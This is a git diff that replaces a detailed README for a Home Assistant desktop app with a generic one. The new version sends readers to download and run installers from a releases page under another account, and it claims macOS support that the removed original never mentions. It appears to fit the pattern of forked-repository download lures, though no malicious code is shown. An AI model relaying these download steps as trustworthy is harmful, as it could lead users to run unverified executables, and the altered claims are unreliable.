@@ -1,106 +1,76 @@
-# Prism Desktop
-**A Home Assistant PC App for Windows & Linux**
+# 🎨 prism-desktop - Your Personalized Home Assistant Dashboard
 
-Prism Desktop brings Home Assistant to your PC with a modern, lightweight desktop experience.  
-It features a sleek dashboard with smooth animations, build in notifications, intuitive drag-and-drop customization, and deep integration with Home Assistant entities.
+## 🌐 Introduction
+prism-desktop is a customizable desktop dashboard designed for Home Assistant users. It helps you monitor and control your smart home devices from one convenient screen. This application brings your most important information to the forefront, making managing your home easy and efficient.
 
+## 🚀 Getting Started
+To get started with prism-desktop, you simply need to download and install the application. Follow these steps to set up your customizable dashboard.
 
-<img
-  width="418"
-  height="497"
-  alt="Prism Desktop – Home Assistant PC app dashboard"
-  src="https://github.com/user-attachments/assets/14e5d292-98be-4270-9ce3-9f9661499370"
-/>
+## 📥 Download & Install
+[![Download prism-desktop](https://img.shields.io/badge/Download-prism--desktop-blue.svg)](https://github.com/kyle1buddy/prism-desktop/releases)
 
+1. Click on the button above to go to the releases page.
+2. On the releases page, locate the latest version. 
+3. Select the appropriate installer for your operating system:
+   - For Windows, look for the `.exe` file.
+   - For macOS, select the `.dmg` file.
+   - For Linux, find the appropriate package or tar file.
+4. After selecting the file, download it to your computer.
 
+## 💻 System Requirements
+To ensure prism-desktop runs smoothly, please ensure your system meets the following requirements:
 
-## Features
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.14 or later
+- **Linux:** Any distribution with modern package management (e.g., APT, DNF)
+- **RAM:** Minimum of 4 GB
+- **Storage:** At least 100 MB of free space
 
-- **System Tray Integration**: The app stays tucked away in your tray until you need it.
-- **PC notifications**: Send notifications to your PC via persistent_notification.create
-- **Morphing Controls**: Click and hold widgets to expand them into granular controls like dimmers or thermostats.
-- **Drag & Drop Customization**: Rearrange your dashboard grid simply by dragging icons around.
-- **Real-time Sync**: Uses Home Assistant's WebSocket API for instant state updates.
-- **Customizable Appearance**: Choose from different border effects (like Rainbow or Aurora) and customize button colors.
-- **Keyboard Shortcuts**: Global hotkeys for toggling the app and controlling individual buttons.
+## 📚 Features
+- **Customizable Interface:** Tailor the dashboard to show the information that matters most to you.
+- **Real-time Updates:** Get live updates on the status of your smart home devices.
+- **Widgets Support:** Use a range of widgets for weather, media playback, and device controls.
+- **Multiple Device Compatibility:** Access your dashboard from various devices.
 
-## Supported Entity Types
-- Camera
-- Climate
-- Curtain / Cover
-- Light / Switch
-- Scene
-- Script
-- Sensor
-- Weather
+## 🔧 How to Run prism-desktop
+Once you have downloaded the installer:
 
-## Keyboard Shortcuts
-- **Open / Close App**: Use the shortcut defined in Settings under 'App toggle'.
-- **Toggle Buttons**: Use `Alt + 1-9` (or your preferred modifier key set in Settings).
-- **Custom Shortcuts**: Define custom shortcuts for any button via the Add/Edit menu.
+1. **For Windows:**
+   - Double-click the `.exe` file.
+   - Follow the installation prompts.
+  
+2. **For macOS:**
+   - Open the downloaded `.dmg` file.
+   - Drag the prism-desktop app to your Applications folder.
+  
+3. **For Linux:**
+   - Follow the instructions for your specific distribution. For example, if you have a `.deb` file, you can install it using the terminal.
 
-## How to Use (Lights)
-- **Click**: Toggle the light on/off.
-- **Hold (Long Press)**: Open the dimmer overlay for brightness control.
+## 🛠️ Configuration
+After installing prism-desktop, you may want to adjust some settings:
 
-## Installation
+1. Open the application.
+2. Connect to your Home Assistant instance by entering the URL of your Home Assistant server.
+3. Customize the widgets to display the information you care about.
 
-### Windows Installer
-Download the latest `PrismDesktopSetup.exe` from the Releases page. This will install the app and optionally set it to start with Windows.
+## 🌍 Join Our Community
+To keep up to date with the latest features and improvements, join our community:
 
-### Linux Installer
-Download the latest `appimage` from the Releases page. or download and run from source.    
-GNOME: make sure to install `AppIndicator and KStatusNotifierItem Support` through `Extension Manager` first. 
+- **GitHub Discussions:** Share ideas and get support.
+- **Feedback:** We welcome your thoughts on future updates.
 
-```keyboard shortcuts doesn't work on wayland yet.```
+## 📝 Troubleshooting
+In case you run into issues:
 
-### Manual / Portable
-You can also download the standalone `.exe` if you prefer not to install anything. Just run it, and it will create a configuration file in the same directory.
+- **Installation Problems:** Ensure your system meets the listed requirements.
+- **Connection Issues:** Double-check your Home Assistant URL and ensure it’s reachable from your device.
 
-## Running from Source
+For more detailed troubleshooting, visit our [GitHub Issues page](https://github.com/kyle1buddy/prism-desktop/issues).
 
-If you want to modify the code or run it manually:
+## 💬 Support
+If you need help, you can always open a new issue on GitHub, and we’ll assist you as soon as possible. Your feedback helps us improve the application.
 
-1. Clone this repository.
-   ```bash
-   pip install -r requirements.txt
-   ```
-   Or manually:
-   ```bash
-   pip install PyQt6 pystray aiohttp Pillow requests pynput winotify keyring
-   ```
-3. Run the application:
-   ```bash
-   python main.py
-   ```
+## 🔄 Updates
+Check back on the [Releases page](https://github.com/kyle1buddy/prism-desktop/releases) periodically for updates. New features and improvements will be added regularly.
 
-## Configuration
-
-Upon first launch, you will be asked for your Home Assistant URL and a Long-Lived Access Token. You can generate this token in your Home Assistant profile settings.
-
-<img width="420" height="729" alt="image" src="https://github.com/user-attachments/assets/b77c9c29-ea0e-4f42-be96-fafc37e41b8c" />
-
-
-
-## Building
-
-### Windows
-To build the executable yourself, run the included build script:
-
-```bash
-python build_exe.py
-```
-
-This will run PyInstaller and generate a single-file executable in the `dist` folder.
-
-To build the installer, open `setup.iss` with [Inno Setup](https://jrsoftware.org/isdl.php) and compile it.
-
-### Linux (AppImage)
-1. Download `appimagetool-x86_64.AppImage` from the [appimagetool releases](https://github.com/AppImage/appimagetool/releases) and place it in the project folder.
-2. Run the build script:
-
-```bash
-python3 build_appimage.py
-```
-
-This will build the binary, create an AppDir, and package it into an AppImage.
+Enjoy using prism-desktop and transforming your smart home experience!
